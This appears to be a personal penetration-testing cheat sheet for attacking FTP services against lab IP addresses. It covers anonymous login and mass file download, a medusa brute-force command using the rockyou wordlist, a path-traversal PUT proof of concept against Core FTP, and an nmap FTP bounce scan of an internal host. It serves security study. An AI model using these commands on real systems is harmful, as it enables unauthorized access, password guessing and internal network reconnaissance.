## Interacting with FTP
---------------
This section aims to obtain information about the server running the service and how it's configured.
#### NMAP SCRIPTS
anon-login
#nmap #nmapscripts
```bash
$ find / -type f -name ftp* 2>/dev/null | grep scripts
```

SSL Certificate, FTP version,  user information, 
```
$ nc -vn 10.129.112.143 21
```

get certificate if any:
```
$ openssl s_client -connect 10.129.22.120:21 -starttls ftp

Server certificate

-----BEGIN CERTIFICATE-----

MIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL
...SNIP...
```

#### Anonymous Login

```shell-session
ftp 10.129.14.136
```

You can us the commands `HELP` and `FEAT` to obtain some information of the FTP server.

Get info on Server Configuration

```
ftp> status
```
Some commands should be used occasionally, as these will make the server show us more information that we can use for our purposes. These commands include `debug` and `trace`.

#### Recursive Listing

```shell-session
ftp> ls -R
```
get file
```shell-session
ftp> get Important\ Notes.txt
```
#### Download All Available Files

```shell-session
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
$ tree .
```

### Download  all files using specific port
```
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136:<PORT-NUMBER>
```
##### UPLOAD FILES
```shell-session
ftp> put testupload.txt 
```
It looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL.
Use `openssl` command used on top


example vulnerability with core ftp (research whats on nmap)
```shell-session
$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Check for anonymous access
```
ftp IP
ftp anonymous@ip -P port idk
NAME: anonymous
pass: anonymous 
```

## Attacking FTP

##### Brute Forcing

If there is no anonymous authentication available, we can also brute-force the login for the FTP services using a list of the pre-generated usernames and passwords. There are many different   
`medusa -u/U -p/P -M ftp -h IP`
EXAMPLE
```shell-session
 medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp -n <port>
```

#### FTP Bounce Attack
An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

Consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ`
Modern FTP servers include protections that, by default, prevent this type of attack, but if these features are misconfigured in modern-day FTP servers, the server can become vulnerable to an FTP Bounce attack.

Bounce attack
```shell-session
$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
FTP command misalignment detected ... correcting.
```

file operations
We can use the commands `ls` and `cd` to move around directories like in Linux. To download a single file, we use `get`, and to download multiple files, we can use `mget`. For upload operations, we can use `put` for a simple file or `mput` for multiple files. We can use `help` in the FTP client session for more information.
